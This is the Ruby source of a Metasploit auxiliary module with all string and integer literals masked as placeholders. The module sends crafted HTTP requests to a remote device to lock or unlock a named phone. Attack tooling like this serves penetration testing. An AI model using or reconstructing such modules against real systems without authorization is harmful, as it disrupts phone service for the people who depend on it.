require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > [ [ <str> , <str> = > <str> ] , [ <str> , <str> = > <str> ] ] , <str> = > <str> ) ) register_options ( [ OptAddress . new ( <str> , [ true , <str> ] ) , OptString . new ( <str> , [ true , <str> ] ) ] , self . class ) end def print_status ( msg = <str> ) super ( <str> peer <str> msg <str> ) end def print_good ( msg = <str> ) super ( <str> peer <str> msg <str> ) end def print_error ( msg = <str> ) super ( <str> peer <str> msg <str> ) end def port_open? begin res = send_request_raw ( { <str> = > <str> , <str> = > <str> } ) return true if res rescue :: Rex :: ConnectionRefused vprint_status ( <str> ) rescue :: Rex :: ConnectionError vprint_error ( <str> ) rescue :: OpenSSL :: SSL :: SSLError vprint_error ( <str> ) end false end def lock ( phone_name ) res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> } , <str> = > { <str> = > <str> , <str> = > <str> , <str> = > phone_name , <str> = > <str> , <str> = > <str> , <str> = > <str> } } ) if res && res . code == <int> if res . body . include? ( <str> ) || res . body . include? ( <str> ) print_good ( <str> phone_name <str> ) elsif res . body . include? ( <str> ) || res . body . include? ( <str> ) || res . body . include? ( <str> ) print_good ( <str> phone_name <str> ) end elsif res print_error ( <str> res . code <str> ) else print_error ( <str> ) end end def unlock ( phone_name ) res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> } , <str> = > { <str> = > <str> , <str> = > phone_name , <str> = > <str> } } ) if res && res . code == <int> if res . body . include? ( <str> ) || res . body . include? ( <str> ) print_good ( <str> phone_name <str> ) elsif res . body . include? ( <str> ) || res . body . include? ( <str> ) print_good ( <str> phone_name <str> ) end elsif res print_error ( <str> res . code <str> ) else print_error ( <str> ) end end def run unless port_open? print_error ( <str> ) return end phone_name = datastore [ <str> ] case action . name when <str> lock ( phone_name ) when <str> unlock ( phone_name ) end end end 
